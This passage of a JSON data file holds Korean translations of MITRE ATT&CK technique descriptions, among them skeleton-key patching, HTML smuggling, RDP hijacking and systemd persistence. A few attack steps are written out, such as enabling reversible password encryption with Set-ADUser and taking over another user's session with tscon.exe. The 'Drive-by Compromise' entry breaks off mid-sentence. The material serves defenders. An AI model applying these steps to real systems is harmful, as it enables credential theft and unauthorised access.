    "description": "적대자는 도메인 컨트롤러의 인증 프로세스를 패치하여 일반적인 인증 메커니즘을 우회하고 계정에 대한 접근을 가능하게 할 수 있습니다.\n\n악성 소프트웨어는 도메인 컨트롤러의 인증 프로세스에 가짜 자격 증명을 주입하는 데 사용될 수 있으며, 이는 사용자의 계정 및/또는 자격 증명에 접근하기 위한 백도어를 생성하기 위한 의도입니다. 패치가 이루어지면 적대자는 주입된 비밀번호를 사용하여 도메인 사용자 계정으로 성공적으로 인증할 수 있습니다(도메인 컨트롤러가 재부팅되어 스켈레톤 키가 메모리에서 지워질 때까지). 인증된 접근은 단일 요소 인증 환경 내의 호스트 및/또는 자원에 무제한으로 접근할 수 있게 할 수 있습니다.",
    "external_id": "T1556.001",
    "modified": "2024-08-21T15:26:54.386Z",
    "translated": true
  },
  {
    "title": "Transfer Data to Cloud Account",
    "description": "적대자는 데이터를 전송하거나 클라우드 환경의 백업을 생성하는 방식으로, 제어하는 다른 클라우드 계정으로 데이터를 유출할 수 있습니다.\n\n정상적인 파일 전송이나 명령 및 제어 채널을 통해 클라우드 환경 외부로의 대규모 전송을 모니터링하는 방어자가 동일 클라우드 제공자의 다른 계정으로의 데이터 전송을 주시하지 않을 수 있습니다. 이러한 전송은 기존 클라우드 제공자의 API와 클라우드 제공자의 내부 주소 공간을 이용해 정상 트래픽에 혼합되거나 외부 네트워크 인터페이스를 통한 데이터 전송을 회피할 수 있습니다.\n\n또한, 적대자는 피해자 데이터를 적대자가 제어하는 클라우드 계정과 공유하기 위해 클라우드 네이티브 메커니즘을 사용할 수 있으며, 예를 들어 익명의 파일 공유 링크를 생성하거나 Azure의 경우 공유 액세스 서명을 사용할 수 있습니다.\n\n적대자가 클라우드 인스턴스의 백업을 생성하고 이를 별도의 계정으로 전송한 사건이 관찰되었습니다.",
    "external_id": "T1537",
    "modified": "2024-10-15T16:08:25.344Z",
    "translated": true
  },
  {
    "title": "HTML Smuggling",
    "description": "적대자는 악의적인 페이로드를 겉보기에는 무해한 HTML 파일 안에 숨겨 컨텐츠 필터를 우회해 데이터와 파일을 밀반입할 수 있습니다. HTML 문서는 나중에 파일과 유사한 객체로 구성할 수 있는 불변 데이터인 JavaScript Blob이라는 대규모 이진 객체를 저장할 수 있습니다. 데이터는 HTML 문서 안에 미디어 유형 또는 MIME 파일을 포함할 수 있는 Data URL로도 저장될 수 있습니다. HTML5는 파일 다운로드를 시작하는 데 사용될 수 있는 다운로드 속성도 도입했습니다.\n\n적대자는 JavaScript Blob 및/또는 HTML5 다운로드 속성을 악용하여 보안 제어를 우회하는 페이로드를 피해자에게 전달할 수 있습니다. 웹 콘텐츠 필터와 같은 보안 제어는 일반적으로 무해한 MIME 유형(예: text/plain 및/또는 text/html)에 기반할 수 있는 HTML/JS 파일 내에 밀반입된 악성 파일을 식별하지 못할 수 있습니다. 악성 파일 또는 데이터는 Data URL 및/또는 JavaScript Blob을 통해 HTML 파일 안에 은폐되고 피해자에게 도달할 때 복호화될 수 있으며, 이로 인해 콘텐츠 필터를 우회할 수 있습니다.\n\n예를 들어, JavaScript Blob을 악용하여 피해자 컴퓨터에서 악의적인 파일을 동적으로 생성할 수 있으며, JavaScript 함수(예: msSaveBlob)를 악용해 디스크에 저장할 수 있습니다.",
    "external_id": "T1027.006",
    "modified": "2024-09-12T19:12:13.006Z",
    "translated": true
  },
  {
    "title": "Reversible Encryption",
    "description": "적대자는 Active Directory 인증 암호화 속성을 악용하여 Windows 시스템에서 자격 증명에 접근할 수 있습니다. <code>AllowReversiblePasswordEncryption</code> 속성은 계정에 대한 복원 가능한 비밀번호 암호화가 활성화되었는지 비활성화되었는지를 지정합니다. 기본적으로 이 속성은 비활성화되어 있으며(대신 사용자의 자격 증명을 단방향 해시 함수의 출력으로 저장함) 기존 소프트웨어나 다른 소프트웨어가 요구하지 않는 한 활성화되어서는 안됩니다.\n\n속성이 활성화되고 사용자가 비밀번호를 변경하면, 적대자는 해당 속성이 활성화된 후 생성되거나 변경된 비밀번호의 평문을 얻을 수 있습니다. 비밀번호를 복호화하기 위해 적대자는 네 가지 구성 요소가 필요합니다:\n\n1. Active Directory 사용자 구조 <code>userParameters</code>에서 추출된 암호화된 비밀번호 (<code>G$RADIUSCHAP</code>)\n2. <code>userParameters</code>에서도 추출된 16바이트 랜덤 생성 값 (<code>G$RADIUSCHAPKEY</code>)\n3. 전역 LSA 비밀 (<code>G$MSRADIUSCHAPKEY</code>)\n4. 원격 액세스 서브 인증 DLL(<code>RASSFM.DLL</code>)에 하드코딩된 정적 키\n\n이 정보를 통해 적대자는 암호화 키를 재현하고 이후에 암호화된 비밀번호 값을 복호화할 수 있습니다.\n\n적대자는 로컬 그룹 정책 편집기, 사용자 속성, 세분화된 비밀번호 정책(FGPP) 또는 Active Directory PowerShell 모듈을 통해 이 속성을 다양한 범위에서 설정할 수 있습니다. 예를 들어, 적대자는 도메인 기능 수준이 \"Windows Server 2008\" 이상으로 설정된 경우 사용자나 그룹에 FGPP를 적용하고 구현할 수 있습니다. PowerShell에서는 적대자가 <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>와 유사한 명령을 사용하여 사용자 설정에 관련된 변경을 할 수 있습니다.",
    "external_id": "T1556.005",
    "modified": "2024-08-26T15:40:31.871Z",
    "translated": true
  },
  {
    "title": "Command Obfuscation",
    "description": "적대자는 명령 실행 중에 내용을 모호하게 하여 탐지를 방해할 수 있습니다. 명령 행 모호화는 명령 및 스크립트 내의 문자열과 패턴을 서명 및 분석하기 어렵게 만드는 방법입니다. 이러한 유형의 모호화는 제공된 페이로드에 의해 실행되는 명령 내에 포함될 수 있습니다.\n\n예를 들어, 적대자는 다양한 기호와 이스케이프 문자를 사용하는 문법을 악용하여 명령을 분석하기 어렵게 만들면서도 동일한 의도된 기능을 유지할 수 있습니다. 많은 언어는 base64 또는 URL 인코딩 형태의 내장 모호화를 지원합니다. 적대자는 또한 문자열 분할, 문자 순서 및 대소문자 조정, 글로벌 명령어 사용, 다양한 트릭을 사용하여 문자열을 토큰/환경 변수/입력 스트림을 통해 전달하는 방법으로도 수동적으로 명령을 모호화할 수 있습니다.\n\n적대자는 또한 디렉터리 탐색과 같은 트릭을 사용하여 명령으로 호출되는 이진 파일에 대한 참조를 모호하게 만들 수 있습니다.\n\n`Invoke-Obfuscation` 및 `Invoke-DOSfucation`와 같은 도구도 명령을 모호화하는 데 사용되었습니다.",
    "external_id": "T1027.010",
    "modified": "2024-09-12T19:43:18.873Z",
    "translated": true
  },
  {
    "title": "File Deletion",
    "description": "적대자는 침입 활동의 결과로 남겨진 파일을 삭제할 수 있습니다. 적대자가 시스템에 드롭하거나 생성한 맬웨어, 도구 또는 기타 비원래 파일들은 네트워크 내에서 수행된 작업과 그 방법을 나타내는 흔적을 남길 수 있습니다. 이러한 파일의 제거는 침입 중에 발생하거나 적대자의 발자국을 최소화하기 위한 침입 후 프로세스의 일환으로 이루어질 수 있습니다.\n\n호스트 운영 체제에서 정리 작업을 수행할 수 있는 도구가 있지만, 적대자는 다른 도구를 사용할 수도 있습니다. 내장된 명령어 및 스크립트 해석기 기능의 예로는 윈도우에서는 <code>del</code>, 리눅스 및 macOS에서는 <code>rm</code> 또는 <code>unlink</code>가 있습니다.",
    "external_id": "T1070.004",
    "modified": "2024-10-15T16:33:59.107Z",
    "translated": true
  },
  {
    "title": "Drive-by Compromise",
    "description": "적대자들은 사용자가 웹사이트를 방문하는 일반적인 과정에서 시스템에 접근할 수 있습니다. 이 기법에서는 사용자의 웹 브라우저가 주로 표적이 되지만",
    "external_id": "T1189",
    "modified": "2024-10-15T15:55:47.494Z",
    "translated": true
  },
  {
    "title": "Network Denial of Service",
    "description": "적대자는 네트워크 서비스 거부(DoS) 공격을 수행하여 사용자에게 대상 리소스의 가용성을 저하시키거나 차단할 수 있습니다. 네트워크 DoS는 서비스가 의존하는 네트워크 대역폭을 소진시킴으로써 발생할 수 있습니다. 특정 웹사이트, 이메일 서비스, DNS 및 웹 기반 애플리케이션이 그 예입니다. 적대자는 정치적 목적을 위해 네트워크 DoS 공격을 수행하는 것이 관찰되었으며, 다른 악성 활동을 지원하기 위함, 예를 들어 집중 분산 공격, 해커 운동 및 공갈 등을 위해 수행합니다.\n\n네트워크 DoS는 시스템에 대한 네트워크 연결의 대역폭 용량이 리소스에 방향된 악성 트래픽의 양으로 소진될 때 발생합니다. 예를 들어, 적대자가 인터넷과 1Gbps 연결을 가진 네트워크에 호스팅된 서버에 10Gbps의 트래픽을 보낼 수 있습니다. 이 트래픽은 단일 시스템이나 여러 시스템이 인터넷에 분산되어 생성될 수 있으며, 이를 보통 분산 서비스 거부(DDoS)라고 합니다.\n\n네트워크 DoS 공격을 수행하기 위해 여러 측면이 여러 방법에 적용되며, 여기에는 IP 주소 스푸핑과 봇넷이 포함됩니다.\n\n적대자는 공격 시스템의 원래 IP 주소를 사용할 수 있거나 소스 IP 주소를 스푸핑하여 공격 트래픽을 추적하기 어렵게 만들거나 반사를 가능하게 할 수 있습니다. 이는 네트워크 방어 장치의 소스 주소에 의한 필터링의 효과를 감소시키거나 없앰으로써 방어자가 공격에 대한 방어를 더욱 어렵게 할 수 있습니다.\n\n호스팅 시스템을 직접적으로 겨낭한 DoS 공격에 대한 자세한 내용은 엔드포인트 서비스 거부를 참조하십시오.",
    "external_id": "T1498",
    "modified": "2024-10-15T16:01:00.510Z",
    "translated": true
  },
  {
    "title": "Cloud Administration Command",
    "description": "적대자는 클라우드 관리 서비스를 남용하여 가상 머신 내에서 명령을 실행할 수 있습니다. AWS Systems Manager, Azure RunCommand, Runbooks와 같은 리소스는 사용자가 설치된 가상 머신 에이전트를 활용하여 가상 머신에서 원격으로 스크립트를 실행할 수 있도록 합니다.\n\n만약 적대자가 클라우드 환경에 대한 관리자 접근 권한을 얻는다면, 클라우드 관리 서비스를 남용하여 해당 환경의 가상 머신에서 명령을 실행할 수 있습니다. 또한 서비스 제공자나 위임된 관리자 계정을 타협한 적대자는 연결된 가상 머신에서 명령을 실행하기 위해 신뢰 관계를 활용할 수 있습니다.",
    "external_id": "T1651",
    "modified": "2024-10-15T13:42:42.543Z",
    "translated": true
  },
  {
    "title": "Installer Packages",
    "description": "적대자는 설치 프로그램을 사용하여 악성 콘텐츠의 실행을 촉발함으로써 지속성을 확립하고 권한을 상승시킬 수 있습니다. 설치 프로그램 패키지는 운영 체제에 따라 다르며, 시스템에 애플리케이션을 설치하는 데 필요한 리소스를 포함합니다. 설치 프로그램 패키지에는 설치 전과 설치 후에 실행되는 스크립트가 포함될 수 있습니다. 설치 프로그램 스크립트는 실행될 때 상승된 권한을 상속받을 수 있습니다. 개발자는 종종 이러한 스크립트를 사용하여 설치를 위한 환경을 준비하고, 요구 사항을 확인하며, 종속성을 다운로드하고, 설치 후 파일을 제거합니다.\n\n정상 애플리케이션을 사용하여 적대자는 수정된 설치 스크립트를 포함한 애플리케이션을 배포하여 악성 콘텐츠를 실행했습니다. 사용자가 애플리케이션을 설치할 때, 설치를 허용하기 위해 관리 권한을 부여해야 할 수 있습니다. 정상 애플리케이션의 설치 과정이 끝나면 `postinstall` 스크립트와 같은 콘텐츠가 상승된 권한으로 실행될 수 있습니다. 적대자는 이러한 스크립트를 사용하여 악성 실행 파일을 실행하거나 상승된 권한으로 다른 악성 구성 요소를 설치할 수 있습니다.\n\n배포에 따라, Linux 버전의 패키지 설치 스크립트는 때때로 유지 관리 스크립트 또는 설치 후 스크립트라고 불립니다. 이러한 스크립트는 `preinst`, `postinst`, `prerm`, `postrm` 스크립트를 포함하고, 실행 시 루트 권한으로 실행됩니다.\n\nWindows의 경우, Microsoft 설치 서비스는 애플리케이션의 설치, 업데이트 및 제거를 관리하기 위해 `.msi` 파일을 사용합니다. 이러한 설치 루틴에는 적대자에 의해 남용될 수 있는 추가 작업을 수행하는 지침이 포함될 수 있습니다.",
    "external_id": "T1546.016",
    "modified": "2024-04-28T15:52:44.332Z",
    "translated": true
  },
  {
    "title": "Scanning IP Blocks",
    "description": "적대자는 피해자의 IP 블록을 스캔하여 타겟팅에 사용할 수 있는 정보를 수집할 수 있습니다. 공용 IP 주소는 블록 단위로 조직에 할당되거나 연속적인 주소 범위로 제공될 수 있습니다.\n\n적대자는 피해자의 네트워크 정보를 수집하기 위해 IP 블록을 스캔할 수 있으며, 이 정보에는 사용 중인 IP 주소와 해당 주소에 할당된 호스트에 대한 자세한 정보가 포함됩니다. 스캔은 간단한 핑(ICMP 요청과 응답)에서부터 서버 배너나 기타 네트워크 유물 등을 통해 호스트 소프트웨어/버전을 드러내는 더 정교한 스캔에 이르기까지 다양합니다. 이러한 스캔에서 수집된 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 설정하거나 초기 접근을 확보하는 데 도움이 될 수 있습니다.",
    "external_id": "T1595.001",
    "modified": "2024-10-15T13:46:55.039Z",
    "translated": true
  },
  {
    "title": "Template Injection",
    "description": "적대자는 사용자 문서 템플릿에서 참조를 생성하거나 수정하여 악성 코드를 숨기거나 인증 시도를 강제할 수 있습니다. Microsoft의 Office Open XML (OOXML) 사양은 이전의 이진 형식(.doc, .xls, .ppt) 대신 Office 문서(.docx, .xlsx, .pptx)를 위한 XML 기반 형식을 정의합니다. OOXML 파일은 다양한 XML 파일로 구성된 ZIP 아카이브로 압축되어 있으며, 이들 XML 파일은 문서가 렌더링되는 방식의 속성을 정의합니다.\n\n부품 내의 속성은 온라인 URL을 통해 접근되는 공유 공공 리소스를 참조할 수 있습니다. 예를 들어, 템플릿 속성은 문서가 로드될 때 가져오는 미리 형식이 지정된 문서 청사진 역할을 하는 파일을 참조할 수 있습니다.\n\n적대자는 이러한 템플릿을 남용하여 사용자 문서를 통해 실행될 악성 코드를 처음에 숨길 수 있습니다. 문서에 주입된 템플릿 참조는 문서가 로드될 때 악성 페이로드를 가져오고 실행할 수 있게 합니다. 이러한 문서는 피싱 및/또는 공유 콘텐츠 오염과 같은 다른 기술을 통해 전달될 수 있으며, 악성 페이로드가 가져와질 때까지는 일반적인 지표(예: VBA 매크로, 스크립트 등)가 나타나지 않기 때문에 정적 탐지를 회피할 수 있습니다. 실제 사례에서는 템플릿 주입이 악성 코드를 로드하는 데 사용된 경우가 있습니다.\n\n적대자는 또한 .rtf 파일 내의 *\\template 제어 단어를 수정하여 유사하게 악성 코드를 숨기고 다운로드할 수 있습니다. 이 합법적인 제어 단어 값은 .rtf 파일이 열릴 때 검색되고 로드되는 템플릿 파일 리소스의 파일.destination을 의도합니다. 그러나 적대자는 기존 .rtf 파일의 바이트를 변경하여 템플릿 제어 단어 필드를 삽입하고 악성 페이로드의 URL 리소스를 포함할 수 있습니다.\n\n이 기술은 SMB/HTTPS (또는 다른 자격 증명 프롬프트) URL을 주입하고 인증 시도를 유발하여 강제 인증을 가능하게 할 수 있습니다.",
    "external_id": "T1221",
    "modified": "2022-01-12T18:16:56.176Z",
    "translated": true
  },
  {
    "title": "RC Scripts",
    "description": "공격자는 유닉스와 유사한 시스템의 시작 시 실행되는 RC 스크립트를 수정하여 지속성을 확립할 수 있습니다. 이러한 파일은 시스템 관리자가 다양한 실행 수준에서 사용자 정의 서비스를 시작하도록 매핑할 수 있도록 허용합니다. RC 스크립트를 수정하려면 루트 권한이 필요합니다.\n\n공격자는 악성 이진 경로 또는 셸 명령을 <code>rc.local</code>, <code>rc.common</code> 및 유닉스와 유사한 배급판에 특정한 기타 RC 스크립트에 추가하여 지속성을 확립할 수 있습니다. 재부팅 시 시스템은 루트 권한으로 스크립트의 내용을 실행하여 지속성이 유지됩니다.\n\n공격자가 RC 스크립트를 악용하는 것은 기본적으로 루트 사용자를 사용하는 경량 유닉스 유사 배급판, 예를 들어 IoT 기기나 임베디드 시스템에 특히 효과적입니다.\n\n일부 유닉스 유사 시스템은 Systemd로 전환하고 RC 스크립트의 사용을 중단했습니다. 이는 이제 macOS에서 [Launchd](https://attack.mitre.org/techniques/T1053/004)를 선호하는 더 이상 사용되지 않는 메커니즘입니다. 이 기술은 RC 스크립트를 여전히 실행하는 Mac OS X Panther v10.3 및 이전 버전에서 사용할 수 있습니다. 후방 호환성을 유지하기 위해 일부 시스템, 예를 들어 우분투는 해당 파일 권한이 올바른 경우 RC 스크립트를 실행합니다.",
    "external_id": "T1037.004",
    "modified": "2024-04-16T12:22:29.150Z",
    "translated": true
  },
  {
    "title": "Access Token Manipulation",
    "description": "대적자는 다른 사용자 또는 시스템 보안 컨텍스트에서 작동하기 위해 액세스 토큰을 수정하여 작업을 수행하고 액세스 제어를 우회할 수 있습니다. Windows는 실행 중인 프로세스의 소유권을 결정하기 위해 액세스 토큰을 사용합니다. 사용자는 액세스 토큰을 조작하여 실행 중인 프로세스가 다른 프로세스의 자식인 것처럼 보이거나 프로세스를 시작한 사용자 외의 다른 사용자에 속하는 것처럼 만들 수 있습니다. 이러한 경우, 프로세스는 새 토큰과 관련된 보안 컨텍스트를 취하게 됩니다.\n\n대적자는 기존 프로세스에서 액세스 토큰을 복사하기 위해 내장된 Windows API 함수를 사용할 수 있으며, 이를 토큰 도용이라고 합니다. 이러한 토큰은 기존 프로세스에 적용되거나 새로운 프로세스를 생성하는 데 사용될 수 있습니다. 대적자는 토큰을 도용하기 위해 이미 특권 사용자 컨텍스트(즉, 관리자)에 있어야 합니다. 그러나 대적자들은 일반적으로 토큰 도용을 사용하여 자신의 보안 컨텍스트를 관리자 수준에서 SYSTEM 수준으로 상승시킵니다. 그런 다음 대적자는 해당 토큰의 계정으로 원격 시스템에 인증할 수 있으며, 계정이 원격 시스템에서 적절한 권한을 가지고 있을 경우 가능합니다.\n\n표준 사용자는 <code>runas</code> 명령과 Windows API 함수를 사용하여 가장하기 토큰을 생성할 수 있으며, 이를 위해 관리자 계정에 대한 접근이 필요하지 않습니다. 액세스 토큰을 수정하는 데 사용할 수 있는 다른 메커니즘, 예를 들어 Active Directory 필드와 같은 것들도 있습니다.",
    "external_id": "T1134",
    "modified": "2023-03-30T21:01:47.762Z",
    "translated": true
  },
  {
    "title": "Multi-Factor Authentication Interception",
    "description": "대적자들은 다단계 인증(MFA) 메커니즘(예: 스마트 카드, 토큰 생성기 등)을 목표로 하여 시스템, 서비스 및 네트워크 리소스에 접근하는 데 사용할 수 있는 자격 증명에 접근할 수 있습니다. MFA 사용은 권장되며 사용자 이름과 비밀번호만 사용할 때보다 더 높은 수준의 보안을 제공합니다. 그러나 조직에서는 이러한 보안 메커니즘을 가로채거나 우회하기 위해 사용될 수 있는 기술에 대해 인지해야 합니다. \n\n다단계 인증에 스마트 카드가 사용될 경우, 정상 사용 중에 스마트 카드와 관련된 비밀번호를 획득하기 위해 키로거가 필요합니다. 삽입된 카드와 스마트 카드 비밀번호에 대한 접근 권한이 있는 대적자는 감염된 시스템을 사용하여 삽입된 하드웨어 토큰으로 인증을 프록시하여 네트워크 리소스에 연결할 수 있습니다. \n\n대적자들은 RSA SecurID와 같은 다른 하드웨어 토큰도 목표로 삼기 위해 키로거를 사용할 수 있습니다. 토큰 입력을 캡처하는 것(사용자의 개인 식별 코드 포함)은 일시적인 접근을 제공할 수 있으며(즉, 다음 값 롤오버까지 일회성 패스코드를 재생) 대적자가 향후 인증 값을 예측할 수 있도록 할 수도 있습니다(알고리즘과 추가된 일시적 코드를 생성하는 데 사용된 시드 값에 접근할 경우). \n\n다른 MFA 방법들도 대적자에 의해 가로채여 인증에 사용될 수 있습니다. 일회성 코드가 아웃 오브 밴드 통신(이메일, SMS 등)을 통해 전송되는 것이 일반적입니다. 장치나 서비스가 안전하지 않다면 가로채기에 취약할 수 있습니다. 서비스 제공자는 또한 목표가 될 수 있습니다: 예를 들어, 대적자는 사용자 휴대폰으로 전송되는 MFA 코드를 훔치기 위해 SMS 메시징 서비스를 손상시킬 수 있습니다.",
    "external_id": "T1111",
    "modified": "2024-10-15T16:37:20.612Z",
    "translated": true
  },
  {
    "title": "Software Packing",
    "description": "적대자는 자신의 코드를 숨기기 위해 소프트웨어 압축이나 가상 머신 소프트웨어 보호를 수행할 수 있습니다. 소프트웨어 압축은 실행 파일을 압축하거나 암호화하는 방법입니다. 실행 파일을 압축하면 서명 기반 탐지를 피하기 위해 파일 서명이 변경됩니다. 대부분의 압축 해제 기술은 메모리에서 실행 코드의 압축을 해제합니다. 가상 머신 소프트웨어 보호는 실행 파일의 원래 코드를 특별한 형식으로 변환하여 오직 특별한 가상 머신만 이 코드를 실행할 수 있도록 합니다. 그런 다음 이 코드를 실행하기 위해 가상 머신이 호출됩니다.\n\n소프트웨어 압축을 수행하는 데 사용되는 유틸리티는 패커라고 불립니다. 예시로는 MPRESS와 UPX가 있습니다. 잘 알려진 패커의 더 포괄적인 목록이 있지만, 적대자는 방어를 회피하기 위해 잘 알려진 패커와 동일한 유물이 남지 않는 자신만의 압축 기술을 만들기도 합니다.",
    "external_id": "T1027.002",
    "modified": "2023-03-30T21:01:48.113Z",
    "translated": true
  },
  {
    "title": "Web Protocols",
    "description": "적대자는 웹 트래픽과 관련된 애플리케이션 계층 프로토콜을 사용하여 기존 트래픽에 섞여 탐지를 피하거나 네트워크 필터링을 회피할 수 있습니다. 원격 시스템에 대한 명령과 종종 그 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽에 포함됩니다. \n\nHTTP/S와 WebSocket과 같은 웹 트래픽을 전달하는 프로토콜은 환경에서 매우 흔하게 사용될 수 있습니다. HTTP/S 패킷은 데이터를 숨길 수 있는 많은 필드와 헤더를 가지고 있습니다. 적대자는 이러한 프로토콜을 악용하여 피해자 네트워크 내에서 자신의 통제 하에 있는 시스템과 통신하면서 정상적이고 예상되는 트래픽을 모방할 수 있습니다.",
    "external_id": "T1071.001",
    "modified": "2024-04-16T12:28:21.234Z",
    "translated": true
  },
  {
    "title": "Visual Basic",
    "description": "적대 세력은 실행을 위해 비주얼 베이직(VB)을 악용할 수 있습니다. VB는 마이크로소프트가 만든 프로그래밍 언어로, Windows API를 통해 구성 요소 객체 모델(COA) 및 네이티브 API와 같은 많은 Windows 기술과 상호 운용성이 있습니다. 미래의 발전 계획은 없지만, VB는 .NET 프레임워크와 크로스 플랫폼 .NET 코어에 통합되고 지원됩니다.\n\nVB를 기반으로 한 파생 언어도 생성되었습니다. 예를 들어, VBA(비주얼 베이직 for 애플리케이션)와 VBScript가 있습니다. VBA는 Microsoft Office와 여러 서드파티 애플리케이션에 내장된 이벤트 기반 프로그래밍 언어입니다. VBA는 문서에 매크로를 포함하여 작업 및 기타 기능의 실행을 자동화할 수 있게 합니다. VBScript는 Windows 호스트의 기본 스크립팅 언어이며, HTML 애플리케이션(HTA) 웹페이지에서 Internet Explorer에 제공되는 JavaScript 대신에도 사용될 수 있습니다(대부분의 최신 브라우저는 VBScript 지원이 포함되어 있지 않습니다).\n\n적대 세력은 VB 페이로드를 사용하여 악성 명령을 실행할 수 있습니다. 일반적인 악성 용도에는 VBScript를 사용하여 행위의 실행을 자동화하거나 VBA 콘텐츠를 스피어피싱 첨부 파일 페이로드에 삽입하는 것이 포함됩니다.",
    "external_id": "T1059.005",
    "modified": "2024-10-15T16:43:27.104Z",
    "translated": true
  },
  {
    "title": "Hidden File System",
    "description": "적대자는 악성 활동을 사용자와 보안 도구로부터 숨기기 위해 숨겨진 파일 시스템을 사용할 수 있습니다. 파일 시스템은 물리적 저장소에서 데이터를 저장하고 접근할 수 있는 구조를 제공합니다. 일반적으로 사용자는 파일과 디렉토리에 접근할 수 있는 애플리케이션을 통해 파일 시스템과 상호작용하며, 이는 물리적 위치(예: 디스크 섹터)로부터의 추상화입니다. 표준 파일 시스템으로는 FAT, NTFS, ext4, APFS가 있습니다. 파일 시스템은 또한 NTFS의 볼륨 부트 레코드(VBR)와 마스터 파일 테이블(MFT)과 같은 다른 구조를 포함할 수 있습니다.\n\n적대자는 감염된 시스템의 표준 파일 시스템과 별도로 자신의 추상화된 파일 시스템을 사용할 수 있습니다. 이렇게 함으로써 적대자는 보안 도구로부터 악성 구성 요소와 파일 입출력의 존재를 숨길 수 있습니다. 숨겨진 파일 시스템은 때때로 가상 파일 시스템이라고도 하며, 여러 방식으로 구현될 수 있습니다. 하나의 구현 방법은 표준 파일 시스템 파티션이나 디스크 구조에서 사용되지 않은 예약된 디스크 공간에 파일 시스템을 저장하는 것입니다. 다른 구현 방법은 적대자가 표준 파일 시스템 위에 자신의 휴대용 파티션 이미지를 파일로 떨어뜨리는 것입니다. 적대자는 또한 비표준 방식으로 기존 파일 시스템 구조에 파일을 분산시킬 수 있습니다.",
    "external_id": "T1564.005",
    "modified": "2020-06-29T15:12:11.024Z",
    "translated": true
  },
  {
    "title": "Systemd Service",
    "description": "적대자는 지속성을 위해 악성 페이로드를 반복적으로 실행하도록 systemd 서비스를 생성 또는 수정할 수 있습니다. systemd는 백그라운드 데몬 프로세스(서비스라고도 함) 및 기타 시스템 자원을 관리하는 데 일반적으로 사용되는 시스템 및 서비스 관리자입니다. systemd는 많은 리눅스 배포판에서 기본 초기화(init) 시스템으로 사용되며, 이전의 init 시스템인 SysVinit 및 Upstart를 대체하면서도 하위 호환성을 유지합니다.\n\nsystemd는 서비스 프로세스에 대한 정보를 인코딩하기 위해 `.service` 파일 확장자를 가진 단위 구성 파일을 사용합니다. 기본적으로 시스템 수준 단위 파일은 루트 소유 디렉토리(`/`)의 `/systemd/system` 디렉토리에 저장됩니다. 사용자 수준 단위 파일은 사용자 소유 디렉토리(`$HOME`)의 `/systemd/user` 디렉토리에 저장됩니다.\n\n`.service` 단위 파일 내에서 다음과 같은 지시어가 명령을 실행하는 데 사용됩니다:\n\n* `ExecStart`, `ExecStartPre`, `ExecStartPost` 지시어는 사용자가 `systemctl`로 수동으로 서비스를 시작하거나 자동 시작하도록 설정된 경우 시스템 시작 시 실행됩니다.\n* `ExecReload` 지시어는 서비스가 재시작될 때 실행됩니다.\n* `ExecStop`, `ExecStopPre`, `ExecStopPost` 지시어는 서비스가 중지될 때 실행됩니다.\n\n적대자는 새로운 서비스 파일을 생성하고, `.service` 파일 지시어가 실행하는 명령을 변경하며, `.service` 파일이 실행되는 사용자 지시어를 수정하여 권한 상승을 초래할 수 있습니다. 또한, 적대자는 이러한 디렉토리에 심볼릭 링크를 배치하여 systemd가 파일 시스템의 어디에 위치하든 상관없이 이러한 페이로드를 찾을 수 있도록 할 수 있습니다.\n\n.service 파일의 사용자 지시어는 서비스를 특정 사용자로 실행하는 데 사용될 수 있으며, 이는 특정 사용자/그룹 권한에 따라 권한 상승을 초래할 수 있습니다.",
    "external_id": "T1543.002",
    "modified": "2024-02-15T14:19:22.282Z",
    "translated": true
  },
  {
    "title": "RDP Hijacking",
    "description": "적대자는 합법적인 사용자의 원격 데스크탑 세션을 탈취하여 환경 내에서 측면 이동을 할 수 있습니다. 원격 데스크탑은 운영 체제에서 일반적으로 제공되는 기능으로, 사용자가 원격 시스템의 그래픽 사용자 인터페이스가 포함된 인터랙티브 세션에 로그인할 수 있게 해줍니다. Microsoft는 원격 데스크탑 프로토콜(RDP)의 구현을 원격 데스크탑 서비스(RDS)라고 부릅니다.\n\n적대자는 RDP 세션 탈취를 수행할 수 있으며, 이는 합법적인 사용자의 원격 세션을 훔치는 것을 포함합니다. 일반적으로 누군가가 세션을 훔치려 할 때 사용자는 공지를 받게 됩니다. 시스템 권한과 터미널 서비스 콘솔을 사용하여 `c:\\windows\\system32\\tscon.exe [탈취할 세션 번호]`를 실행하면, 적대자는 사용자에게 자격 증명이나 알림 없이 세션을 탈취할 수 있습니다. 이는 원격 또는 로컬에서 활동 중인 세션이나 연결이 해제된 세션 모두에서 수행될 수 있습니다. 이는 도메인 관리자 또는 더 높은 권한의 계정 세션을 훔쳐 원격 시스템 탐색과 권한 상승으로 이어질 수 있습니다. 이러한 모든 작업은 기본 Windows 명령어를 사용하여 수행할 수 있지만, 레드 팀 도구에도 기능으로 추가되었습니다.",
    "external_id": "T1563.002",
    "modified": "2023-08-14T15:37:02.771Z",
    "translated": true
  },
  {
    "title": "Create Account",
    "description": "적대자들은 희생자 시스템에 대한 접근을 유지하기 위해 계정을 생성할 수 있습니다. 충분한 수준의 접근 권한이 있을 경우, 이러한 계정을 생성하는 것은 시스템에 영구적인 원격 접근 도구를 배포할 필요가 없는 보조 인증된 접근을 확립하는 데 사용될 수 있습니다.\n\n계정은 로컬 시스템 또는 도메인이나 클라우드 테넌트 내에서 생성될 수 있습니다. 클라우드 환경에서는 적대자들이 특정 서비스에만 접근할 수 있는 계정을 생성할 수 있으며, 이는 탐지될 확률을 줄일 수 있습니다.",
    "external_id": "T1136",
    "modified": "2024-10-15T15:53:21.895Z",
    "translated": true
  },
  {
    "title": "XDG Autostart Entries",
    "description": "적대자는 XDG Autostart 항목을 추가하거나 수정하여 사용자의 데스크탑 환경이 로그인 시 로드될 때 악성 프로그램이나 명령을 실행할 수 있습니다. XDG Autostart 항목은 모든 XDG 호환 리눅스 시스템에서 사용할 수 있습니다. XDG Autostart 항목은 데스크탑 항목 파일(`.desktop`)을 사용하여 사용자의 로그인 시 데스크탑 환경을 구성합니다. 이러한 구성 파일은 사용자 로그인 시 어떤 애플리케이션이 실행될지를 결정하고, 특정 파일 유형을 열기 위한 연관 애플리케이션을 정의하며, 이동식 매체를 열기 위해 사용되는 애플리케이션을 정의합니다.\n\n적대자는 이 기능을 악성 이진 파일이나 명령의 경로를 `.desktop` 구성 파일의 `Exec` 명령어에 추가하여 지속성을 확립하는 데 악용할 수 있습니다. 사용자의 데스크탑 환경이 로그인 시 로드될 때, XDG Autostart 디렉토리에 위치한 `.desktop` 파일이 자동으로 실행됩니다. 시스템 전역 Autostart 항목은 `/etc/xdg/autostart` 디렉토리에 위치하고, 사용자 항목은 `~/.config/autostart` 디렉토리에 위치합니다.\n\n적대자는 이 